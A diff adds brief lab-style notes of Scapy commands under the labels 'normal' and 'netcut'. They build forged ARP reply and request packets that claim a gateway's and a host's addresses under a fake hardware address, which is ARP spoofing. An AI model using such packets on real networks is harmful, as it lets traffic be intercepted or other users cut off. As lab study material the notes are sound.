@@ -1,0 +1,10 @@
+normal
+a=ARP(op=2, psrc = "192.168.213.128", hwsrc = "bb:bb:bb:bb:bb:bb", pdst = "192.168.213.2", hwdst= "00:0c:29:16:6a:ef")
+
+a=ARP(op=2, psrc = "192.168.213.2", hwsrc = "bb:bb:bb:bb:bb:bb", pdst = "192.168.213.21", hwdst= "00:0c:29:16:6a:ef")
+
+netcut
+
+a=ARP(op=1, psrc = "192.168.213.2", hwsrc = "bb:bb:bb:bb:bb:bb", pdst = "192.168.213.21")
+
+
